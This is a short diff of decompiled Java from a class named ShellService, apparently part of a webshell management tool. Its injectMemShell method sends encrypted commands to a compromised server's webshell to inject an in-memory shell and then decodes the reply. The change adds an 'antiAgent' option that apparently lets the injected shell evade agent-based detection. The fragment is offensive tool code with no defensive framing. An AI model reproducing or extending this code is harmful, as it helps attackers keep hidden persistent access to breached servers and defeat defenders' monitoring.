@@ -1398,21 +1398,22 @@ public class ShellService {
       return result;
    }
 
-   public JSONObject injectMemShell(String type, String libPath, String path, String password) throws Exception {
+   public JSONObject injectMemShell(String type, String libPath, String path, String password, boolean isAntiAgent) throws Exception {
       Map params = new LinkedHashMap();
       params.put("type", type);
       params.put("libPath", libPath);
       params.put("path", path);
       params.put("password", password);
+      params.put("antiAgent", isAntiAgent + "");
       byte[] data = Utils.getData(this.currentKey, this.encryptType, "MemShell", params, this.currentType);
       Map resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
       byte[] resData = (byte[])((byte[])resultObj.get("data"));
       String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
       JSONObject result = new JSONObject(resultTxt);
-      Iterator var11 = result.keySet().iterator();
+      Iterator var12 = result.keySet().iterator();
 
-      while(var11.hasNext()) {
-         String key = (String)var11.next();
+      while(var12.hasNext()) {
+         String key = (String)var12.next();
          result.put(key, (Object)(new String(Base64.decode(result.getString(key)), "UTF-8")));
       }
 
